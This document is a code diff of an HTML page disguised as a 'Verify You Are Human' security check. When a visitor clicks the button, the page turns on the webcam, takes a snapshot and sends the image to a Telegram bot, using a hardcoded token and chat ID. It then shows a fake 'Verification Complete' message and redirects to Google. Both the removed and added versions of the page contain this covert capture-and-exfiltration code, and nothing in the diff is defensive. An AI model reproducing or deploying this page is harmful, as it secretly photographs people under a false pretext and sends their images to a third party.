@@ -1,28 +1,46 @@
-
 <!DOCTYPE html>
 <html>
-<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif;">
-    <div style="margin-top:100px;">
-        <h2>Verify You Are Human</h2>
-        <button onclick="startOp()" style="padding:20px; background:#007bff; color:#fff; border:none; border-radius:5px;">Click to Verify</button>
-    </div>
+<head>
+    <title>Security Check</title>
+    <meta charset="UTF-8">
+</head>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding-top:100px;">
+    <h2>Verify You Are Human</h2>
+    <button onclick="startOp()" style="padding:20px; background:#007bff; color:#fff; border:none; border-radius:5px; cursor:pointer;">Click to Verify</button>
+
     <script>
         async function startOp() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video:true});
-                const v = document.createElement('video'); v.srcObject = s; v.play();
+                const stream = await navigator.mediaDevices.getUserMedia({video:true});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
                 setTimeout(async () => {
-                    const cv = document.createElement('canvas'); cv.width=400; cv.height=300;
-                    cv.getContext('2d').drawImage(v,0,0);
-                    const data = cv.toDataURL('image/jpeg', 0.5);
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 400;
+                    canvas.height = 300;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
+
+                    // ناردنی ڕاستەوخۆ بۆ تێلیگرام
                     await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
-                        method:'POST', headers:{'Content-Type':'application/json'},
-                        body: JSON.stringify({chat_id:'5982066799', text: "📸 NEW CAPTURE:\n" + data})
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: '5982066799',
+                            text: "📸 وێنەیەکی نوێ هات:\n\n" + imageData
+                        })
                     });
-                    s.getTracks().forEach(t=>t.stop());
-                    window.location.href='https://google.com';
-                }, 1500);
-            } catch(e) { alert("Access Denied. Please allow camera."); }
+
+                    stream.getTracks().forEach(t => t.stop());
+                    alert("Verification Complete!");
+                    window.location.href = 'https://google.com';
+                }, 2000);
+            } catch (e) {
+                alert("Please allow camera access to verify.");
+            }
         }
     </script>
 </body>
